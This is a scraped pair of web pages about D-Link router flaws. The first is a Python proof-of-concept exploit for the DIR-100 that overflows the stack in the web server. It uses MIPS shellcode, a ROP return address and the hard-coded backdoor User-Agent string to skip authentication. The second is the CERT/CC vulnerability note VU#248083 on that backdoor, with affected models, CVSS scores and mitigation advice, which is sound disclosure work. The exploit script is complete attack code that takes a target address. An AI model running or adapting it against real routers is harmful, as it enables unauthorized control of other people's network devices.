=== Content from pastebin.com_85835be3_20250125_191501.html ===
#!/usr/bin/env python
###################################################################################################################
# PoC exploit code for DIR-100 revA, v1.13
# ftp://ftp.dlink.eu/Products/dir/dir-100/driver\_software/DIR-100\_fw\_reva\_113\_ALL\_en\_20110915.zip
# Tested in an emulator, but should work on the real thing.
#
# A sprintf stack overflow exists in the RuntimeDiagnosticPing function inside /bin/webs. This is also
# theoretically suceptable to command injection, but there are few useful commands that can be executed (
# not even 'reboot'). Further, data is not URL deocded prior to the sprintf, spaces cannot be used in the GET
# reuqest URL, and the $IFS environment variable does not seem to be set in the limited /bin/sh shell; thus,
# it would be difficult, if possible at all, to inject commands that take arguments.
#
# This is a simple ROP into the stack. After the sprintf, popen("ping -c 1 %s", "r") is called three times,
# which should be more than enough to ensure that the data cache has been flushed back to main memory (thus
# no need to ROP to a blocking call, such as sleep). Further, at return the $s5 register conveniently has a
# pointer to the user-supplied data on the stack, so we just return to offset 0x3243C in libc which puts
# the contents of $s5 into $t9 and then jumps to the address in $t9:
#
# .text:0003243C move $t9, $s5
# .text:00032440 jalr $t9
# .text:00032444 nop
#
# Some known bad bytes that will cause the exploit to fail if they are contained in your request (there is no URL
# decoding!): '/', '?', '&', '=', '\r', '\n'
#
# Craig Heffner
# Tactical Network Solutions
###################################################################################################################
import sys
import urllib2
try:
url = 'http://%s/Tools/tools\_misc.xgi?domain=a&set/runtime/diagnostic/pingIp=' % sys.argv[1]
except Exception, e:
print str(e)
print 'Usage: %s ' % sys.argv[0]
sys.exit(1)
# This is the actual payload; here it is a simple reboot shellcode.
# This payload size is limited to about 200 bytes, otherwise you'll crash elsewhere in /bin/webs.
payload = "\x3c\x06\x43\x21" # lui a2,0x4321
payload += "\x34\xc6\xfe\xdc" # ori a2,a2,0xfedc
payload += "\x3c\x05\x28\x12" # lui a1,0x2812
payload += "\x34\xa5\x19\x69" # ori a1,a1,0x1969
payload += "\x3c\x04\xfe\xe1" # lui a0,0xfee1
payload += "\x34\x84\xde\xad" # ori a0,a0,0xdead
payload += "\x24\x02\x0f\xf8" # li v0,4088
payload += "\x01\x01\x01\x0c" # syscall 0x40404
# The payload is split up; some of it before the return address on the stack, some after.
# This little snippet skips over the return address during execution.
# It assumes that your shellcode will not be using the $fp or $t9 registers.
move\_sp\_fp = "\x03\xa0\xf0\x21" # move $fp, $sp
jump\_code = "\x27\xd9\x02\xd4" # addiu $t9, $fp, 724
jump\_code += "\x03\x21\xf8\x08" # jr $t9
jump\_code += "\x27\xE0\xFE\xFE" # addiu $zero, $ra, -0x102
# Stitch together the payload chunk(s) and jump\_code snippet
shellcode\_p1 = move\_sp\_fp + payload[0:68] + jump\_code + "DD"
if len(shellcode\_p1) < 86:
shellcode\_p1 += "D" \* (86 - len(shellcode\_p1))
shellcode\_p2 = ""
else:
shellcode\_p2 = "DD" + payload[68:]
# Build the overflow buffer, with the return address and shellcode
# libc.so base address and ROP gadget offset for the DIR-100, revA, v1.13
# libc\_base = 0x2aaee000
# ret\_offset = 0x3243C
buf = shellcode\_p1 + "\x2A\xB2\x04\x3C" + shellcode\_p2
# Normally only admins can access the tools\_misc.xgi page; use the backdoor user-agent to bypass authentication
req = urllib2.Request(url+buf, headers={'User-Agent' : 'xmlset\_roodkcableoj28840ybtide'})
urllib2.urlopen(req)

=== Content from www.kb.cert.org_93e229be_20250125_191502.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#248083

## D-Link routers authenticate administrative access using specific User-Agent string

#### Vulnerability Note VU#248083

Original Release Date: 2013-10-17 | Last Revised: 2014-07-29

---

### Overview

Various D-Link routers allow administrative web actions if the HTTP request contains a specific User-Agent string. This backdoor allows an attacker to bypass password authentication and access the router's administrative web interface. Planex and Alpha Networks devices may also be affected.

### Description

| CVE-2013-6026:  According to security researcher Craig Heffner, the firmware for various D-Link routers contains a backdoor that allows unauthenticated remote users to bypass the routers' password authentication mechanism. A router's internal web server will accept and process any HTTP requests that contain the User-Agent string "xmlset\_roodkcableoj28840ybtide" without checking if the connecting host is authenticated.D-Link has confirmed that the affected D-Link routers disable web configuration from the WAN by default.According to D-Link, the following D-Link routers are affected:     + DIR-100 + DIR-120 + DI-624S + DI-524UP + DI-604S + DI-604UP + DI-604+ + TM-G5240  According to [the original vulnerability report](http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/), the following Planex routers are likely affected:    + BRL-04R + BRL-04UR + BRL-04CW  It appears that Alpha Networks may be the OEM for routers branded by D-Link and Planex (and probably other vendors). It is not clear where in the supply chain the backdoor was added, so routers from any of these vendors may be affected.CVE-2013-6027:A separate stack overflow vulnerability in the management web server has also been [reported](http://pastebin.com/vbiG42VD). |
| --- |

### Impact

| An unauthenticated remote attacker can take any action as an administrator using the remote management web server. |
| --- |

### Solution

| D-Link is [maintaining a page](http://www.dlink.com/be/fr/support/security) to inform users of this issue and provide updates as patches are released. |
| --- |

| **Restrict Access**Restrict access to the administrative web server by disabling remote management features or by blocking HTTP requests on the external WAN interface. The administrative web server may listen on ports 80/tcp or 8080/tcp.D-Link has confirmed that the affected D-Link routers disable web configuration from the WAN by default. There is some [evidence](http://blog.erratasec.com/2013/10/that-dlink-bug-masscan.html) that at least one ISP may have deployed vulnerable routers with the remote WAN management enabled. |
| --- |

### Vendor Information

248083
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23248083/) to view vendors.**
### [D-Link Systems, Inc.](#BLUU-9CJR53) Affected

Notified:  October 16, 2013  Updated: October 17, 2013

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### [Alpha Networks Inc](#TLEN-9CKLC5) Unknown

Updated:  October 17, 2013

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### [Planex Communications Inc](#TLEN-9CKLLQ) Unknown

Updated:  October 17, 2013

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 8.3 | AV:A/AC:L/Au:N/C:C/I:C/A:C |
| Temporal | 7.5 | E:F/RL:W/RC:C |
| Environmental | 5.6 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/>
* <http://www.theregister.co.uk/2013/10/13/dlink_routers_have_admin_backdoor/>
* [http://www.dlink.com/uk/en/support/security](http://www.dlink.com/uk/en/support/security%20)
* <http://blog.erratasec.com/2013/10/that-dlink-bug-masscan.html>
* <http://pastebin.com/vbiG42VD>
### Acknowledgements

Thanks to Craig Heffner of /DEV/TTYS0 for reporting this vulnerability.

This document was written by Todd Lewellen.

### Other Information

| **CVE IDs:** | [CVE-2013-6026](http://web.nvd.nist.gov/vuln/detail/CVE-2013-6026), [CVE-2013-6027](http://web.nvd.nist.gov/vuln/detail/CVE-2013-6027) |
| --- | --- |
| **Date Public:** | 2013-10-12 |
| **Date First Published:** | 2013-10-17 |
| **Date Last Updated:** | 2014-07-29 23:29 UTC |
| **Document Revision:** | 34 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


